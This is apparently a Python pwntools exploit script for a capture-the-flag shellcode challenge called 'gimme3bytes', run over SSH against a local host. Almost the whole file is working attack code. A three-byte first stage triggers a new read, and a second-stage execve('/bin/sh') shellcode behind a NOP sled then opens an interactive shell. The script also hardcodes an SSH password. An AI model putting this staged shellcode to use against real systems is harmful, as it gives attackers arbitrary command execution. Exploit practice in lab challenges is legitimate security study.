
from pwn import *
from getpass import *
import logging

#context(log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

host = "acidburn"

ip = "127.0.0.1"
path = "/challenges/shellcode/gimme3bytes/"
prt = int(input(" insert "+host+"'s port to connect to:"))
pwd = getpass("insert "+host+"'s password:")
prt = 3022
pwd = '0607991337'

print("Connecting to "+host+" at "+ip+" to execute syscall")

ssh_p = ssh(host,ip,password=pwd,port= prt)

process = "."+path+"gimme3bytes"
#r = ssh_p.process(process)

r= gdb.debug([process], ssh = ssh_p,gdbscript ='''b *0x4011ec
                                                   continue
                                                   si
                                                   si
                                                   ''')
# the key here is to pop the top of the stack into rdx in order to obtain a valid number
#please note that the address of the syscall IS NOT a valid unsigned number, it is too big (?)
#so we'll just feed it a smaller number
CODE_='''
      pop rdx
      syscall
      '''

shellcode= asm(CODE_, arch="amd64")

payload= shellcode


input("Press key to initiate the new SYS_read: ")
r.send(payload)


#rcx contains the address giving us the base of the allocated code,we'll use that to write
#a simple shellcode
CODE_='''
        mov r14,rcx
        mov rbx, 0x0068732f6e69622f
        mov rsp,r14
        add rsp,0x100
        push rbx
        mov rdi,rsp
        xor rbx,rbx
        push rbx
        mov rsi,rsp
        mov rdx,rsp
        mov rax,0x3b
        syscall
      '''
shellcode = asm(CODE_, arch="amd64")
payload = b"\x90"*3+shellcode + b"\x90"*1000

input("Press key to inject stage two: ")
r.send(payload)
r.interactive()
#from this point on the connection opens a shell for stdin/stdout
